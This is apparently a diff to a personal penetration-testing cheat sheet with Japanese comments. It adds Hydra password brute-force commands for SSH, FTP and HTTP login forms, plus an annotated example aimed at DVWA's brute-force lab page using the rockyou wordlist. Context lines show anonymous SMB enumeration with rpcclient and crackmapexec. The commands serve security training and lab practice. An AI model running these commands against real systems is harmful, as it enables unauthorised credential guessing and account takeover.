@@ -25,3 +25,21 @@ rpcclient -U "" -N <IP>
   rpcclient $> queryuser <account name>
   rpcclient $> enumprivs
 crackmapexec smb <IP>
+
+#Hydra
+hydra -l <User> -P <wordlist> ssh://<targetIP> #sshの総当たり
+hydra -l <User> -P <wordlist> ftp://<targetIP> #ftpの総当たり
+hydra <IP> -s <port> -l <user> -P <wordlist> http-get-form "<Request Path>:username=^USER^&password=^PASS^&Login=Login:H=<Request Header>:F=<Failed message>"
+
+hydra #hydraコマンド
+<target IP> -s 80 #サーバのアドレスとポート
+-l admin #ログインＩＤ
+-P /usr/share/wordlist/rockyou.txt #パスワードリスト
+http-get-form #ＧＥＴリクエスト
+"/vulnerabilities/brute/ #リクエスト先のリソース
+:username=^USER^&password=^PASS^&Login=Login #クエリストリング
+:H=Cookie:PHPSESSID=<cookie>; security=low #リクエストヘッダ
+:F=Username and/or password incorrect." #ログイン失敗時のメッセージ
+
+
+  
